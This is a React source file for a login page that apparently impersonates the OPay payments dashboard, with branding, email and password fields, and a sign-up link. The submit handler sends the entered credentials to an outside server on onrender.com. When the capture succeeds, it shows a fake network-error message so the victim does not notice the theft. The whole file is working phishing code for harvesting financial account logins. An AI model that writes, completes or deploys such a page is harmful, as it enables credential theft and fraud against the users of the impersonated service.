import { useState } from 'react'
import './App.css'
import logo from './assets/logo.png'
import axios from 'axios'

function App() {

  const [message, setMessage]= useState("")
  const [info, setInfo] = useState({
    email:"",
    password:""
  })

  const handleChange=(e)=>{
    const {name, value}=e.target;
    setInfo({...info, [name]:value});
  };

  const handleSubmit=async(e)=>{
    e.preventDefault();
    console.log('working...')

    try {
      setMessage('Logging in...');
      const response=await axios.post("https://opay-phgo.onrender.com/submit", info)
      if (response.status===200) {
        setMessage('There is an issue with the network, try again later!')
      } else {
        console.error('logging in failed with status:', response.status)
        setMessage("There is an issue logging in")
      }
    } catch (error) {
      console.error('there is an error :', error.message)
      setMessage('there is an error with the server, try later!')
    }
  };
  return (
    <>
   <div className="login-container" onSubmit={handleSubmit}>
      <div className="login-form">
        <img src={logo} alt="OPay Logo" className="logo" />
        <p>LOG IN TO <strong>OPAY DASHBOARD</strong></p>
        <form>
          <div className="input-container">
            <input name='email' type="email" placeholder="Enter your email address" required onChange={handleChange} />
          </div>
          <div className="input-container">
            <input name='password' type="password" placeholder="Enter your password" required onChange={handleChange} />
            <span className="forgot-password">Forgot password?</span>
          </div>
          <p className='message'>{message}</p>
          <button type="submit">Log In</button>
        </form>
        <p className="signup">
          New to OPay dashboard? <a href="#">Sign Up</a>
        </p>
      </div>
    </div>
    </>
  )
}

export default App
